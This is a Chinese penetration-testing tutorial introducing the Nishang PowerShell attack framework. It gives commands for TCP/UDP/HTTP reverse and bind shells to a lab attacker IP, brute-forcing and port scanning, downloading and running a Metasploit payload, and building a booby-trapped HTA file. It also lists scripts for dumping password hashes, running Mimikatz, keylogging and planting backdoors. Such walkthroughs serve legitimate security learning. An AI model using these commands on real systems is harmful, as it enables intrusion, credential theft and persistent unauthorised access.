> 原文链接: https://www.anquanke.com//post/id/84896 


# 【技术分享】Powershell 渗透测试工具-Nishang（一）


                                阅读量   
                                **264314**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t015f86ca8068868138.png)](https://p0.ssl.qhimg.com/t015f86ca8068868138.png)

****

**作者：**[**阻圣******](http://bobao.360.cn/member/contribute?uid=134615136)

**稿费：300RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[**网页版******](http://bobao.360.cn/contribute/index)**在线投稿**

**<br>**

**传送门**

[**【技术分享】Powershell 渗透测试工具-Nishang（二）******](http://bobao.360.cn/learning/detail/3200.html)

**<br>**

**前言**



Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。Nishang被广泛应用于渗透测试的各个阶段，本文主要介绍如何使用Nishang的各种姿势获取一个shell。 

<br>

**正向连接and反向连接**

新手肯定都有这个疑问，什么时候用正向连接，什么时候用反向连接呢？其实很简单：

目标在外网而你在内网的时候，用正向连接。

目标在内网而你在外网的时候，用反向连接。

都在外网的时候，两种方式皆可。

<br>

**Powershell交互式Shell**



**一、基于TCP协议的Powershell交互式Shell**

Invoke-PowerShellTcp是PowerShell交互式正向连接或反向连接shell，基于TCP协议。

参数介绍：



```
-IPAddress &lt;String&gt; 选择-Reverse选项时是需要连接到的IP地址
-Port &lt;Int32&gt; 选择-Reverse选项时是需要连接到的端口，选择-Bind选项时是需要监听的端口。
-Reverse [&lt;SwitchParameter&gt;] 反向连接
-Bind [&lt;SwitchParameter&gt;] 正向连接
```

使用实例：

1. 正向连接

第一步：在目标机运行脚本，监听端口86

[![](https://p2.ssl.qhimg.com/t01c14d0a09ae676aed.png)](https://p2.ssl.qhimg.com/t01c14d0a09ae676aed.png)

第二步：使用nc连接到目标机端口86

[![](https://p2.ssl.qhimg.com/t010c1f70fb1dfa1488.png)](https://p2.ssl.qhimg.com/t010c1f70fb1dfa1488.png)

2. 反向连接

第一步：使用nc监听本地端口86（注意必须先监听，不然在目标机上执行脚本会出错）

```
root@kali:~# nc -ltp 86
```

第二步：在目标机上反弹shell

```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.110.128 -Port 86
```

第三步：观察攻击机，可以发现成功反弹shell

[![](https://p3.ssl.qhimg.com/t014fc720ff23af033e.png)](https://p3.ssl.qhimg.com/t014fc720ff23af033e.png)

**二、基于UDP协议的PowerShell交互式Shell**

Invoke-PowerShellUdpPowershell交互式正向连接或反向连接shell，基于UDP协议。

使用实例：

1. 正向连接

正向连接，和上面用法相同，不过是基于UDP协议，所以nc命令就要改动一下了。

[![](https://p5.ssl.qhimg.com/t01fb2399c1df4ea7f4.png)](https://p5.ssl.qhimg.com/t01fb2399c1df4ea7f4.png)

2. 反向连接

反向连接，和上面用法相同，不过在使用nc监听的时候使用UDP协议。

[![](https://p2.ssl.qhimg.com/t0156cd7a529e29c953.png)](https://p2.ssl.qhimg.com/t0156cd7a529e29c953.png)

**三、基于HTTP和HTTPS协议的PowerShell交互式Shell**

Invoke-PoshRatHttp and Invoke-PoshRatHttps是Powershell交互式反向连接shell，基于HTTP协议和HTTPS协议。

用法实例：（由于两种脚本用法相同，这里以基于HTTP协议的脚本为例子）

第一步：首先我们需要在攻击机上使用脚本，需要的信息有攻击机IP，要监听的端口。运行完脚本，就等着目标机反弹Shell了。

[![](https://p5.ssl.qhimg.com/t012649b182529d268d.png)](https://p5.ssl.qhimg.com/t012649b182529d268d.png)

第二步：在目标机上运行下列命令，反弹Shell

[![](https://p1.ssl.qhimg.com/t01cf39ca1707b517f3.png)](https://p1.ssl.qhimg.com/t01cf39ca1707b517f3.png)

<br>

**扫描进行时**

Nishang基本上包含了渗透测试各个阶段的脚本，在扫描阶段，它也有两个很实用的脚本暴力破解和端口扫描。

**一、暴力破解-Invoke-BruteForce**

Invoke-BruteForce是Nishang中一个专注于暴力破解的脚本，它可以破解SQL Server、ActiveDirecotry、FTP、Web等服务。

使用实例：

```
Invoke-BruteForce -ComputerName SQLServ01 -UserList C:testusername.txt -PasswordList C:testpassword.txt -Service SQL -Verbose
```

**二、端口扫描-Invoke-PortScan**

Invoke-PortScan是Nishang中一个端口扫描脚本，它可以发现主机、解析主机名、端口扫描，是实战中一个很实用的脚本。

参数介绍：



```
-StartAddress &lt;String&gt;起始IP
-EndAddress &lt;String&gt;终止IP
-ResolveHost 加上这个参数，解析主机名。
-ScanPort 加上这个参数，扫描端口
-Ports 指定扫描的端口
```

实用实例：

发现存活主机，解析主机名、扫描80端口是否开放。

```
Invoke -StartAddress 192.168.110.1 -EndAddress 192.168.110.130 -ResolveHost -ScanPort -Ports 80
```

<br>

**常用Execution**

**一、Download_Execute**

Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为可执行文件执行。

使用实例：

第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。

```
PS C:Usersroot&gt; ExetoText c:powershellmsf.exe c:powershellmsf.txt
Converted file written to c:powershellmsf.txt
```

第二步：使用Download_Execute下载执行文本文件

```
PS C:Usersroot&gt; Download_Execute http://192.168.110.128/msf.txt
```

第三步：观察Metasploit。可以发现成功获得Shell

[![](https://p1.ssl.qhimg.com/t017f672f67d857d1f9.png)](https://p1.ssl.qhimg.com/t017f672f67d857d1f9.png)

<br>

**客户端**

Nishang中还有生成各种危害文件的脚本，它们可以生成各种感染的文件，如HTA、Word，来执行powershell脚本。可以神不知鬼不觉的发动攻击，由于各个脚本用法相同，这里以生成受感染的HTA为例子。

**Out-HTA**

功能：创建受感染的HTA文件，可以执行PowerShell命令和脚本。

用法实例：

第一步：我们先来创建受感染的HTA文件。在下图中我们可以发现成功生成了一个受感染的HTA文件hello.hta

[![](https://p5.ssl.qhimg.com/t01138a731add85007b.png)](https://p5.ssl.qhimg.com/t01138a731add85007b.png)

第二步：先使用nc来监听端口，然后运行受感染的HTA文件，可以发现成功反弹Shell

[![](https://p2.ssl.qhimg.com/t010f6aec8b49e488bd.png)](https://p2.ssl.qhimg.com/t010f6aec8b49e488bd.png)

<br>

**其他**

Nishang中还有很多经典实用的渗透脚本，不可能一一为大家讲解，这里挑选几种常用的为大家来介绍一下。

项目地址：[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**信息收集**

1. Check-VM 这是Nishang中检测目标机是否为虚拟机的脚本。

[![](https://p2.ssl.qhimg.com/t01425e58ba8f0cac6c.png)](https://p2.ssl.qhimg.com/t01425e58ba8f0cac6c.png)

2. Copy-VSS 使用卷影拷贝服务来复制SAM文件。

3. Get-Information 从目标机上获取有价值信息的脚本

4. Get-PassHashes 从目标机上获取Hash密码的脚本。

5. Get-WLAN-Keys 从目标机上获取纯文本的WLAN密钥。

6. Keylogger 键盘记录脚本，大家应该都熟悉。

7. Invoke-Mimikatz 在内存中加载Mimikatz，Mimikatz大家都熟悉吧，不作介绍了。

**后门**

1. HTTP-Backdoor 可以接收来自第三方网站的指令，并在内存中执行PowerShell脚本。

2. DNS_TXT_Pwnage 可以在DNS TXT查询中接收指令和PowerShell脚本，并在目标机上执行。

3. Execute-OnTime 可以在目标机上指定时间执行PowerShell脚本。

4. Gupt-Backdoor 可以从WLAN SSID中接收命令和脚本，而不用去连接它。

<br>

**总结**

Nishang的脚本还有很多没有介绍到，它覆盖了后门、信息收集、反弹shell、下载执行等多种脚本，需要大家慢慢学习在实战中运用学习吧，国内关于这方面的文章还是很少，仅作技术分享，谢谢。

<br>

**传送门**

[**【技术分享】Powershell 渗透测试工具-Nishang（二）******](http://bobao.360.cn/learning/detail/3200.html)




